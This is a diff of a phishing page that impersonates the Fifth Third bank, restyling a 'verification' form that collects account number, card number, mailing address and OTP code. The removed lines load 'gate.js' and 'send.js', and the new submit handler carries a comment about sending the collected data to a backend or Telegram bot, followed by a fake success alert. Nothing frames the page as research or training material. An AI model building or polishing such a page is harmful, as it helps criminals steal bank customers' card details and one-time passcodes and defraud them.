@@ -4,14 +4,159 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Fifth Third Secure Panel</title>
-  <link rel="stylesheet" href="/assets/style.css">
-  <style>body { background: linear-gradient(135deg, #1a357a 0%, #2248b0 100%) !important; }</style>
-  <script src="/gate.js" defer></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
+    }
+    .header {
+      background-color: white;
+      padding: 15px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .logo-img {
+      width: 40px;
+      height: 40px;
+      object-fit: contain;
+      border-radius: 4px;
+      background: #2e5aa0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-text {
+      font-size: 24px;
+      font-weight: bold;
+      color: #2e5aa0;
+      letter-spacing: 1px;
+    }
+    .header-links {
+      display: flex;
+      gap: 15px;
+      font-size: 14px;
+      color: #666;
+    }
+    .breadcrumb {
+      background-color: white;
+      padding: 10px 30px;
+      font-size: 14px;
+      color: #666;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .breadcrumb a {
+      color: #4a90e2;
+      text-decoration: none;
+    }
+    .login-bg {
+      background: linear-gradient(135deg, #2c5282 0%, #4a90e2 100%);
+      min-height: 600px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 20px;
+    }
+    .login-card {
+      background: white;
+      border-radius: 8px;
+      padding: 35px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+    .login-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .verify-form label {
+      display: block;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #555;
+      font-weight: 500;
+    }
+    .verify-form input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+    .verify-form input:focus {
+      outline: none;
+      border-color: #4a90e2;
+    }
+    .login-btn {
+      width: 100%;
+      background-color: #1a357a;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+      letter-spacing: 1px;
+    }
+    .login-btn:hover {
+      background-color: #2248b0;
+    }
+    .info-section {
+      background-color: white;
+      padding: 60px 30px;
+      text-align: center;
+    }
+    .info-section h2 {
+      font-size: 28px;
+      color: #333;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+    .info-section p {
+      font-size: 16px;
+      color: #666;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    @media (max-width: 600px) {
+      .header, .header-left, .header-links {
+        flex-direction: column;
+        align-items: flex-start;
+        margin: 0 8px;
+      }
+      .login-card {
+        max-width: 98vw;
+        padding: 8vw 2vw 8vw 2vw;
+      }
+      .breadcrumb {
+        padding-left: 16px;
+      }
+    }
+  </style>
 </head>
 <body>
   <div class="header">
     <div class="header-left">
-      <div class="logo-placeholder">53</div>
+      <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
+      <span class="brand-text">FIFTH THIRD</span>
     </div>
     <div class="header-links">
       <span>CUSTOMER SERVICE</span>
@@ -19,24 +164,38 @@
       <span>BRANCH & ATM LOCATOR</span>
     </div>
   </div>
-  <div class="center-panel">
-    <div class="login-title">Verification Required</div>
-    <form class="verify-form" id="verify-form">
-      <label>Account Number
-        <input type="text" name="accountnumber" required>
-      </label>
-      <label>Card Number
-        <input type="text" name="cardnumber" maxlength="19" pattern="[0-9 ]{13,19}" required>
-      </label>
-      <label>Mailing Address
-        <input type="text" name="mailingaddress" required>
-      </label>
-      <label>OTP Code
-        <input type="text" name="otp" maxlength="6" pattern="\d{4,6}" required>
-      </label>
-      <button type="submit" class="login-btn">Submit</button>
-    </form>
+  <div class="breadcrumb"><a href="#">Home</a> &gt; <b>Verification</b></div>
+  <div class="login-bg">
+    <div class="login-card">
+      <div class="login-title">Account Verification</div>
+      <form class="verify-form" id="verify-form">
+        <label>Account Number
+          <input type="text" name="accountnumber" required>
+        </label>
+        <label>Card Number
+          <input type="text" name="cardnumber" required>
+        </label>
+        <label>Mailing Address
+          <input type="text" name="mailingaddress" required>
+        </label>
+        <label>OTP Code
+          <input type="text" name="otp" required>
+        </label>
+        <button type="submit" class="login-btn">Submit</button>
+      </form>
+    </div>
   </div>
-  <script src="send.js"></script>
+  <div class="info-section">
+    <h2>Account Verification Required</h2>
+    <p>For your security, please verify your account details to continue.</p>
+  </div>
+  <script>
+    document.getElementById('verify-form').onsubmit = function(e) {
+      e.preventDefault();
+      // Collect all form data and send to your backend or Telegram bot
+      // Example: sendToTelegram({...});
+      alert('Verification data submitted!');
+    };
+  </script>
 </body>
 </html> 
